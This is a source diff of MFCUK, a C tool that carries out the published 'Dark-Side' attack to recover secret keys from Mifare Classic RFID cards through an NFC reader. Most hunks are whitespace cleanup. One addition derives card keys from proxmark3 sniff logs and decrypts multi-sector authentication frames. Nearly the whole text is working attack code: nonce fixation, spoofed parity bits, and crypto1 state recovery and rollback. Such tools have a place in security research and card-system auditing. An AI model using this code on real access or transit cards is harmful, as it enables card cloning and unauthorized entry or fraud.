@@ -5,27 +5,27 @@
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 2 of the License, or
  (at your option) any later version.
- 
+
  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.
- 
+
  You should have received a copy of the GNU General Public License
- along with this program.  If not, see <http://www.gnu.org/licenses/>. 
+ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
 
 /*
  Package:
     MiFare Classic Universal toolKit (MFCUK)
- 
+
  Filename:
     mfcuk_keyrecovery_darkside.c
 
  Name:
     Mifare Classic "Dark-Side" Attack to reover at least 1 key for card where NO keys
     are known. Uses as a corner-stone the lfsr_common_prefix() from crapto1 3.1
-    
+
     After this, the MFOC from Nethemba team is used to recover rest of the
     keys using "Nested-Authentication" Attack
 
@@ -33,8 +33,8 @@
     Implementing Mifare Classic "Dark Side" Key Recovery attack from this paper:
     "THE DARK SIDE OF SECURITY BY OBSCURITY"
     http://eprint.iacr.org/2009/137.pdf
-    
-    For tag fixation it uses the DROP FIELD and CONSTANT DELAY after drop and 
+
+    For tag fixation it uses the DROP FIELD and CONSTANT DELAY after drop and
     before authentication technique. Most of the times it gives pretty good results.
 
     To improve the overall results, the Nt tag nonces are stored and looked-up in
@@ -58,11 +58,11 @@
 
  Compiling:
     Linux/MacOS/Cygwin
-        gcc -o zv_mf_dark_side zv_mf_dark_side.c ./crapto1-v3.1/crapto1.c 
-            ./crapto1-v3.1/crypto1.c ./libnfc-v1.2.1/bin/libnfc.lib -lnfc 
+        gcc -o zv_mf_dark_side zv_mf_dark_side.c ./crapto1-v3.1/crapto1.c
+            ./crapto1-v3.1/crypto1.c ./libnfc-v1.2.1/bin/libnfc.lib -lnfc
             -I./libnfc-v1.2.1/include -L./libnfc-v1.2.1/lib
     MSVS
-        just copy an existing project (nfc-anticol for example) from libnfc-1.2.1-vs2005, 
+        just copy an existing project (nfc-anticol for example) from libnfc-1.2.1-vs2005,
         add the crapto1 .c files to the project and zv_mf_dark_side.c
 
  Usage:
@@ -82,13 +82,13 @@
  Contact, bug-reports:
     http://andreicostin.com/
     mailto:zveriu@gmail.com
- 
+
  Requirements:
     crapto1 library 3.1        (http://code.google.com/p/crapto1)
     libnfc 1.4.2               (http://www.libnfc.org)
 
  * @file mfcuk_keyrecovery_darkside.c
- * @brief 
+ * @brief
 */
 
 /*
@@ -103,7 +103,7 @@
 | dd/mm/yyyy : 14/11/2009
 | Author     : zveriu@gmail.com, http://andreicostin.com
 | Description: Fixed some info; removed uneeded code, variables, commented lines;
-| proper identation; introduced some portability fixes; 
+| proper identation; introduced some portability fixes;
 --------------------------------------------------------------------------------
 | Number     : 0.3
 | dd/mm/yyyy : 14/11/2009
@@ -237,7 +237,7 @@ int compareTagNonces (const void * a, const void * b)
 uint32_t mfcuk_verify_key_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui64Key, mifare_key_type bKeyType, byte_t bTagType, uint32_t uiBlock)
 {
     uint32_t pos;
-    
+
     // Keystream related variables - for verification with Crapto1/Crypto1 rollback
     uint32_t nr_encrypted = 0;
     uint32_t reader_response = 0;
@@ -246,7 +246,7 @@ uint32_t mfcuk_verify_key_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui64
     uint32_t ks3 = 0;
     struct Crypto1State *pcs;
     uint64_t lfsr;
-    
+
     // Communication related variables
     byte_t abtAuth[4]        = { 0x00,0x00,0x00,0x00 };
     byte_t abtArEnc[8]       = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
@@ -255,27 +255,27 @@ uint32_t mfcuk_verify_key_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui64
     byte_t abtRxPar[MAX_FRAME_LEN];
     size_t szRx;
     uint32_t nt, nt_orig; // Supplied tag nonce
-    
+
     if ( (bKeyType != keyA) && (bKeyType != keyB) )
     {
         return MFCUK_FAIL_KEYTYPE_INVALID;
     }
-    
+
     if ( !IS_MIFARE_CLASSIC_1K(bTagType) && !IS_MIFARE_CLASSIC_4K(bTagType) )
     {
         return MFCUK_FAIL_TAGTYPE_INVALID;
     }
-    
+
     if ( !is_valid_block(bTagType, uiBlock) )
     {
         return MFCUK_FAIL_BLOCK_INVALID;
     }
-    
+
     // Configure the authentication frame using the supplied block
     abtAuth[0] = bKeyType;
     abtAuth[1] = uiBlock;
     iso14443a_crc_append(abtAuth,2);
-    
+
     // Now we take over, first we need full control over the CRC
     if ( !nfc_configure(pnd,NDO_HANDLE_CRC,false) )
     {
@@ -295,17 +295,17 @@ uint32_t mfcuk_verify_key_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui64
     // Save the tag nonce (nt)
     nt = bswap_32(*((uint32_t *) &abtRx));
     nt_orig = nt;
-    
+
     // Init cipher with key
     pcs = crypto1_create(ui64Key);
 
     // Load (plain) uid^nt into the cipher
     for (pos=0; pos<4; pos++)
     {
-        // Update the cipher with the tag-initialization 
+        // Update the cipher with the tag-initialization
         crypto1_byte(pcs, ((uiUID >> (8*(3-pos))) & 0xFF ) ^ abtRx[pos], 0);
     }
-    
+
     // Generate (encrypted) nr+parity by loading it into the cipher (Nr)
     for (pos=0; pos<4; pos++)
     {
@@ -319,14 +319,14 @@ uint32_t mfcuk_verify_key_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui64
         nr_encrypted = nr_encrypted << 8;
         nr_encrypted = nr_encrypted | abtArEnc[pos];
     }
-    
+
     // Skip 32 bits in pseudo random generator
     nt = prng_successor(nt,32);
-  
+
     // Generate reader-answer from tag-nonce (Ar)
     for (pos=4; pos<8; pos++)
     {
-        // Get the next random byte for verify the reader to the tag 
+        // Get the next random byte for verify the reader to the tag
         nt = prng_successor(nt,8);
 
         // Encrypt the reader-answer (nt' = suc2(nt))
@@ -339,7 +339,7 @@ uint32_t mfcuk_verify_key_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui64
         reader_response = reader_response << 8;
         reader_response = reader_response | abtArEnc[pos];
     }
-    
+
     // Finally we want to send arbitrary parity bits
     if ( !nfc_configure(pnd,NDO_HANDLE_PARITY,false) )
     {
@@ -348,17 +348,17 @@ uint32_t mfcuk_verify_key_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui64
 
     if ( !nfc_initiator_transceive_bits(pnd,abtArEnc,64,abtArEncPar,abtRx,&szRx,abtRxPar) )
     {
-	    return MFCUK_FAIL_AUTH;
+        return MFCUK_FAIL_AUTH;
     }
 
     crypto1_destroy(pcs);
 
     if (szRx == 32)
     {
-        for (pos=0; pos<4; pos++)   
+        for (pos=0; pos<4; pos++)
         {
-	        tag_response = tag_response << 8;
-	        tag_response = tag_response | abtRx[pos];
+            tag_response = tag_response << 8;
+            tag_response = tag_response | abtRx[pos];
         }
 
         ks2 = reader_response ^ prng_successor(nt_orig, 64);
@@ -382,7 +382,7 @@ uint32_t mfcuk_verify_key_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui64
     {
         return MFCUK_FAIL_AUTH;
     }
-    
+
     return MFCUK_SUCCESS;
 }
 
@@ -414,12 +414,12 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
     {
         return MFCUK_FAIL_KEYTYPE_INVALID;
     }
-    
+
     if ( !IS_MIFARE_CLASSIC_1K(bTagType) && !IS_MIFARE_CLASSIC_4K(bTagType) )
     {
         return MFCUK_FAIL_TAGTYPE_INVALID;
     }
-    
+
     if ( !is_valid_block(bTagType, uiBlock) )
     {
         return MFCUK_FAIL_BLOCK_INVALID;
@@ -450,9 +450,9 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
     // Save the tag nonce (nt)
     nt = bswap_32(*((uint32_t *) &abtRx));
 
-	// zveriu
-	//printf("INFO - Nonce distance %d (from 0x%08x, to 0x%08x)\n", nonce_distance(nt, nt_orig), nt, nt_orig);
-	nt_orig = nt;
+    // zveriu
+    //printf("INFO - Nonce distance %d (from 0x%08x, to 0x%08x)\n", nonce_distance(nt, nt_orig), nt, nt_orig);
+    nt_orig = nt;
 
     // Max log(2, MAX_TAG_NONCES) searches, i.e. log(2, 65536) = 16
     ptrFoundTagNonceEntry = (tag_nonce_entry_t *) bsearch((void *)(&nt_orig), arrSpoofEntries, numSpoofEntries, sizeof(arrSpoofEntries[0]), compareTagNonces);
@@ -490,7 +490,7 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
     {
         ptrFoundTagNonceEntry->num_of_appearances++;
 
-        
+
         if ( // If we went beyond MFCUK_DARKSIDE_MAX_LEVELS without findind a key, need to check next {Nr}
             (ptrFoundTagNonceEntry->current_out_of_8 >= MFCUK_DARKSIDE_MAX_LEVELS) ||
              // Can have only 32 combinations of the last 5 bits of parity bits which generated the first NACK
@@ -555,7 +555,7 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
     // Load (plain) uid^nt into the cipher
     for (pos=0; pos<4; pos++)
     {
-        // Update the cipher with the tag-initialization 
+        // Update the cipher with the tag-initialization
         // TODO: remove later - crypto1_byte(pcs, pbtUid[pos]^abtRx[pos], 0);
         crypto1_byte(pcs, ((uiUID >> (8*(3-pos))) & 0xFF ) ^ abtRx[pos], 0);
     }
@@ -586,11 +586,11 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
 
     // Skip 32 bits in pseudo random generator
     nt = prng_successor(nt,32);
-  
+
     // Generate reader-answer from tag-nonce (Ar)
     for (pos=4; pos<8; pos++)
     {
-        // Get the next random byte for verify the reader to the tag 
+        // Get the next random byte for verify the reader to the tag
         nt = prng_successor(nt,8);
 
         // Encrypt the reader-answer (nt' = suc2(nt))
@@ -638,13 +638,13 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
             ptrFoundTagNonceEntry->spoofParBitsEnc++;
         }
 
-	    return MFCUK_FAIL_AUTH;
+        return MFCUK_FAIL_AUTH;
     }
 
-	// zveriu - Successful: either authentication (szRx == 32) either encrypted 0x5 reponse (szRx == 4)
-	if (szRx == 4)
-	{
-		//printf("INFO - 4-bit (szRx=%d) error code 0x5 encrypted (abtRx=0x%02x)\n", szRx, abtRx[0] & 0xf);
+    // zveriu - Successful: either authentication (szRx == 32) either encrypted 0x5 reponse (szRx == 4)
+    if (szRx == 4)
+    {
+        //printf("INFO - 4-bit (szRx=%d) error code 0x5 encrypted (abtRx=0x%02x)\n", szRx, abtRx[0] & 0xf);
 
         if (ptrFoundTagNonceEntry->current_out_of_8 < 0)
         {
@@ -699,7 +699,7 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
                 }
 
                 crypto1_destroy(states_list);
-                
+
                 if (!flag_key_recovered)
                 {
                     //printf("{Nr} is not a DEADBEEF.... Need to find BEEF ALIVE!... Trying next one...\n");
@@ -714,7 +714,7 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
                 }
             }
         }
-	}
+    }
     else if (szRx == 32)
     {
         // Are we so MFCUKing lucky (?!), since ui64Key is a "dummy" key
@@ -722,7 +722,7 @@ uint32_t mfcuk_key_recovery_block(nfc_device_t* pnd, uint32_t uiUID, uint64_t ui
         *ui64KeyRecovered = ui64Key;
     }
 
-    //printf(" At: "); 
+    //printf(" At: ");
     //print_hex_par(abtRx,szRx,abtRxPar);
 
     crypto1_destroy(pcs);
@@ -793,7 +793,7 @@ void print_mifare_classic_tag_actions(const char *title, mifare_classic_tag *tag
     {
         return;
     }
-    
+
     bTagType = tag->amb->mbm.btUnknown;
 
     if ( !IS_MIFARE_CLASSIC_1K(bTagType) && !IS_MIFARE_CLASSIC_4K(bTagType) )
@@ -802,7 +802,7 @@ void print_mifare_classic_tag_actions(const char *title, mifare_classic_tag *tag
     }
 
     printf("%s - UID %02x %02x %02x %02x - TYPE 0x%02x (%s)\n",
-        title, tag->amb->mbm.abtUID[0], tag->amb->mbm.abtUID[1], tag->amb->mbm.abtUID[2], tag->amb->mbm.abtUID[3], bTagType, 
+        title, tag->amb->mbm.abtUID[0], tag->amb->mbm.abtUID[1], tag->amb->mbm.abtUID[2], tag->amb->mbm.abtUID[3], bTagType,
         (IS_MIFARE_CLASSIC_1K(bTagType)?(MIFARE_CLASSIC_1K_NAME):(IS_MIFARE_CLASSIC_4K(bTagType)?(MIFARE_CLASSIC_4K_NAME):(MIFARE_CLASSIC_UNKN_NAME)))
         );
     printf("---------------------------------------------------------------------\n");
@@ -829,15 +829,15 @@ void print_mifare_classic_tag_actions(const char *title, mifare_classic_tag *tag
 
         ptr_trailer = (mifare_classic_block_trailer *) ((char *)tag + (trailer_block * MIFARE_CLASSIC_BYTES_PER_BLOCK) );
 
-        printf("%d\t|  %02x%02x%02x%02x%02x%02x\t| %c %c | %c %c\t|  %02x%02x%02x%02x%02x%02x\t| %c %c | %c %c\n", 
+        printf("%d\t|  %02x%02x%02x%02x%02x%02x\t| %c %c | %c %c\t|  %02x%02x%02x%02x%02x%02x\t| %c %c | %c %c\n",
             get_sector_for_block(bTagType, trailer_block),
-            ptr_trailer->abtKeyA[0], ptr_trailer->abtKeyA[1], ptr_trailer->abtKeyA[2], 
+            ptr_trailer->abtKeyA[0], ptr_trailer->abtKeyA[1], ptr_trailer->abtKeyA[2],
             ptr_trailer->abtKeyA[3], ptr_trailer->abtKeyA[4], ptr_trailer->abtKeyA[5],
             (ptr_trailer->abtAccessBits[ACTIONS_KEY_A] & ACTIONS_VERIFY)?'V':'.',
             (ptr_trailer->abtAccessBits[ACTIONS_KEY_A] & ACTIONS_RECOVER)?'R':'.',
             (ptr_trailer->abtAccessBits[RESULTS_KEY_A] & ACTIONS_VERIFY)?'V':'.',
             (ptr_trailer->abtAccessBits[RESULTS_KEY_A] & ACTIONS_RECOVER)?'R':'.',
-            ptr_trailer->abtKeyB[0], ptr_trailer->abtKeyB[1], ptr_trailer->abtKeyB[2], 
+            ptr_trailer->abtKeyB[0], ptr_trailer->abtKeyB[1], ptr_trailer->abtKeyB[2],
             ptr_trailer->abtKeyB[3], ptr_trailer->abtKeyB[4], ptr_trailer->abtKeyB[5],
             (ptr_trailer->abtAccessBits[ACTIONS_KEY_B] & ACTIONS_VERIFY)?'V':'.',
             (ptr_trailer->abtAccessBits[ACTIONS_KEY_B] & ACTIONS_RECOVER)?'R':'.',
@@ -968,26 +968,31 @@ int main(int argc, char* argv[])
     mifare_classic_tag_ext dump_loaded_tag;
     mifare_classic_tag_ext tag_on_reader;
     mifare_classic_tag_ext tag_recover_verify;
-    
+
     // fingerprint options related
     mifare_classic_tag finger_tag;
     float finger_score;
     float finger_score_highest;
     int finger_index_highest;
-    
+
     // proxmark3 log related
-    #define PM3_UID         0
-    #define PM3_TAG_CHAL    1
-    #define PM3_NR_ENC      2
-    #define PM3_READER_RESP 3
-    #define PM3_TAG_RESP    4
-    
+    #define PM3_UID             0
+    #define PM3_TAG_CHAL        1
+    #define PM3_NR_ENC          2
+    #define PM3_READER_RESP     3
+    #define PM3_TAG_RESP        4
+    #define PM3_MULTISECT_AUTH  5
+
     uint32_t pm3_full_set_log[5]; // order is: uid, tag_challenge, nr_enc, reader_response, tag_response
+    uint32_t pm3_log_multisect_auth;
     uint32_t pm3_ks2;
     uint32_t pm3_ks3;
-    struct Crypto1State *pm3_revstate;
+    struct Crypto1State *pm3_revstate = NULL;
+    struct Crypto1State *pm3_revstate_multisect_auth = NULL;
     uint64_t pm3_lfsr;
     unsigned char* pm3_plfsr = (unsigned char*)&pm3_lfsr;
+    uint8_t pm3_log_multisect_decrypted[4];
+    uint8_t pm3_log_multisect_verified[4];
 
     // various related
     int i, j, k;
@@ -1017,7 +1022,7 @@ int main(int argc, char* argv[])
     // MAIN ( broken-brain (: ) logic of the tool
     // ---------------------------------------
     clear_screen();
-    
+
     print_identification();
 
     if (argc < 2)
@@ -1025,7 +1030,7 @@ int main(int argc, char* argv[])
         print_usage(stdout, argv[0]);
         return 1;
     }
-    
+
     // Load fingerprinting "database"
     mfcuk_finger_load();
 /*
@@ -1071,10 +1076,10 @@ int main(int argc, char* argv[])
                     keyOpt[st] = hex2bin(optarg[2 * st], optarg[2 * st + 1]);
                 }
 
-                // Increase number of keys 
+                // Increase number of keys
                 numDefKeys++;
-                
-                // Also increase the memory to hold one more key. Hope not many keys will be specified, 
+
+                // Also increase the memory to hold one more key. Hope not many keys will be specified,
                 // so realloc() will not impact performance and will not fragment memory
                 if ( !(current_default_keys = realloc(current_default_keys, numDefKeys * MIFARE_CLASSIC_KEY_BYTELENGTH)) )
                 {
@@ -1220,7 +1225,7 @@ int main(int argc, char* argv[])
                                 case 'B':
                                     specific_key_type = keyA + (token[0] - 'A');
 
-                                    // Invalidate all the opposite keys 
+                                    // Invalidate all the opposite keys
                                     for (i = ( (sector==-1)?(0):(sector) ); i < ( (sector==-1)?(MIFARE_CLASSIC_4K_MAX_SECTORS):(sector+1) ); i++)
                                     {
                                         // TODO: proper error handling for block and ptr_trailer
@@ -1354,23 +1359,23 @@ int main(int argc, char* argv[])
                 token = NULL;
                 str = optarg;
                 iter = 0;
-                
+
                 // parse the arguments of the option. ugly, ugly... i know :-S
                 while ( (token = strtok(str, sep)) && (iter < sizeof(pm3_full_set_log)/sizeof(pm3_full_set_log[0])) )
                 {
                     str = NULL;
                     errno = 0;
                     pm3_full_set_log[iter] = strtoul(token, NULL, 16);
-                    
+
                     // strtoul failed somewhere. WTF?! strtoul() is not properly setting errno... errrrrggh!
                     if (errno != 0)
                     {
-                        WARN("Invalid hex literal %s for option -P", optarg);
+                        WARN("Invalid hex literal %s for option -P at position %d", optarg, iter);
                     }
-                    
+
                     iter++;
                 }
-                
+
                 // if not all arguments were fine, fire warning
                 if ( iter != sizeof(pm3_full_set_log)/sizeof(pm3_full_set_log[0]) )
                 {
@@ -1385,6 +1390,7 @@ int main(int argc, char* argv[])
                     */
                     pm3_ks2 = pm3_full_set_log[PM3_READER_RESP] ^ prng_successor(pm3_full_set_log[PM3_TAG_CHAL], 64);
                     pm3_ks3 = pm3_full_set_log[PM3_TAG_RESP] ^ prng_successor(pm3_full_set_log[PM3_TAG_CHAL], 96);
+
                     pm3_revstate = lfsr_recovery64(pm3_ks2, pm3_ks3);
                     lfsr_rollback_word(pm3_revstate, 0, 0);
                     lfsr_rollback_word(pm3_revstate, 0, 0);
@@ -1393,6 +1399,52 @@ int main(int argc, char* argv[])
                     crypto1_get_lfsr(pm3_revstate, &pm3_lfsr);
                     printf("proxmark3 log key: %02x%02x%02x%02x%02x%02x\n", pm3_plfsr[5], pm3_plfsr[4], pm3_plfsr[3], pm3_plfsr[2], pm3_plfsr[1], pm3_plfsr[0]);
                     crypto1_destroy(pm3_revstate);
+
+                    // If all minimum required details from the log were parsed and still there are some more hex tokens, it might be a multi-sector authentication test request
+                    if (token)
+                    {
+                        errno = 0;
+                        pm3_log_multisect_auth = strtoul(token, NULL, 16);
+
+                        // strtoul failed somewhere. WTF?! strtoul() is not properly setting errno... errrrrggh!
+                        if (errno != 0)
+                        {
+                            WARN("Invalid hex literal %s for option -P at position %d", optarg, iter);
+                        }
+                        else
+                        {
+                            // TODO: what if the multi-sect authentication comes not directly after the first successful plain authentication, i.e. several read/write/incr/decr command occur first then multi-sect auth?! how does this affects the crypto stream/state, what should we do? need to simulate with a nfc-multisect-auth program which has tests with interleaved multi-sect authentications
+                            pm3_revstate_multisect_auth = lfsr_recovery64(pm3_ks2, pm3_ks3);
+
+                            for (i=0; i<4; i++)
+                            {
+                                uint8_t multisect_auth_byte = (pm3_log_multisect_auth >> (8 * (3-i))) & 0xFF;
+                                pm3_log_multisect_decrypted[i] = crypto1_byte(pm3_revstate_multisect_auth,0x00,0) ^ multisect_auth_byte;
+                                pm3_log_multisect_verified[i] = pm3_log_multisect_decrypted[i];
+                            }
+
+                            if (   (pm3_log_multisect_decrypted[0] == MC_AUTH_A || pm3_log_multisect_decrypted[0] == MC_AUTH_B)
+                                   // TODO: This "<= MIFARE_CLASSIC_4K_MAX_BLOCKS" should be properly checked against either MIFARE_CLASSIC_1K_MAX_BLOCKS or MIFARE_CLASSIC_4K_MAX_BLOCKS (depending on card type detected)
+                                && (pm3_log_multisect_decrypted[1] >= 0x00 && pm3_log_multisect_decrypted[1] <= MIFARE_CLASSIC_4K_MAX_BLOCKS)
+                               )
+                            {
+                                iso14443a_crc_append(pm3_log_multisect_verified, 2);
+                                int multisect_auth_verified = 1;
+                                for (i=0; i<4; i++)
+                                {
+                                    if (pm3_log_multisect_verified[i] != pm3_log_multisect_decrypted[i])
+                                    {
+                                        multisect_auth_verified = 0;
+                                        break;
+                                    }
+                                }
+
+                                printf("proxmark3 log multi-sect auth detected: %02X %02X %02X %02X (parity crc %s)\n", pm3_log_multisect_decrypted[0], pm3_log_multisect_decrypted[1], pm3_log_multisect_decrypted[2], pm3_log_multisect_decrypted[3], multisect_auth_verified?"ok":"NOK");
+                            }
+
+                            crypto1_destroy(pm3_revstate_multisect_auth);
+                        }
+                    }
                 }
                 break;
             case 'p':
@@ -1420,14 +1472,14 @@ int main(int argc, char* argv[])
                     {
                         finger_score = -1.0f;
                         mfcuk_finger_db[i].tmpl_comparison_func(&(finger_tag), mfcuk_finger_db[i].tmpl_data, &finger_score);
-                        
+
                         if (finger_score > finger_score_highest)
                         {
                             finger_score_highest = finger_score;
                             finger_index_highest = i;
                         }
                     }
-                    
+
                     if (finger_index_highest > -1)
                     {
                         printf("Tag '%s' matches '%s' with highest score %f\n", optarg, mfcuk_finger_db[finger_index_highest].tmpl_name, finger_score_highest);
@@ -1453,7 +1505,7 @@ int main(int argc, char* argv[])
                 break;
         }
     }
-    
+
     // Unload fingerprinting
     mfcuk_finger_unload();
 
@@ -1521,7 +1573,7 @@ int main(int argc, char* argv[])
             tag_recover_verify.uid = bswap_32 (*((uint32_t *) &(tag_recover_verify.tag_basic.amb[0].mbm.abtUID)));
         }
     }
-    
+
     if (!bfOpts['C'])
     {
         printf("NO Connection to reader requested (need option -C). Exiting...\n");
@@ -1531,13 +1583,13 @@ int main(int argc, char* argv[])
     // READER INITIALIZATION BLOCK
     // Try to open the NFC reader
     pnd = nfc_connect(NULL);
-  
+
     if (pnd == NULL)
     {
         ERR("connecting to NFC reader");
         return 1;
     }
-    
+
     if ( !nfc_initiator_init(pnd) )
     {
         ERR("initializing NFC reader: %s", pnd->acName);
@@ -1585,7 +1637,7 @@ int main(int argc, char* argv[])
     }
 
     max_sectors = (IS_MIFARE_CLASSIC_1K(tag_recover_verify.type)?MIFARE_CLASSIC_1K_MAX_SECTORS:MIFARE_CLASSIC_4K_MAX_SECTORS);
-    
+
     // VERIFY KEYS CODE-BLOCK
     printf("\nVERIFY: ");
     for (k = keyA; k <= keyB; k++)
@@ -1630,7 +1682,7 @@ int main(int argc, char* argv[])
                     WARN("mfcuk_key_arr_to_uint64() failed, verification key will be %012"PRIx64"", crntVerifKey);
                 }
 
-		/*
+        /*
                 // TODO: make this kind of key verification as part of option -a - advanced verification of keys with crapto1 rollback for double verification
                 // TEST
                 nfc_disconnect(pnd);
@@ -1669,10 +1721,10 @@ int main(int argc, char* argv[])
 
                 // Reset advanced settings
                 mfcuk_darkside_reset_advanced(pnd);
-		*/
+        */
                 memcpy(mp.mpa.abtUid, tag_recover_verify.tag_basic.amb[0].mbm.abtUID, MIFARE_CLASSIC_UID_BYTELENGTH);
                 memcpy(mp.mpa.abtKey, &(current_default_keys[j][0]), MIFARE_CLASSIC_KEY_BYTELENGTH);
-                
+
                 if ( !nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &ti) )
                 {
                     ERR("tag was removed or cannot be selected");
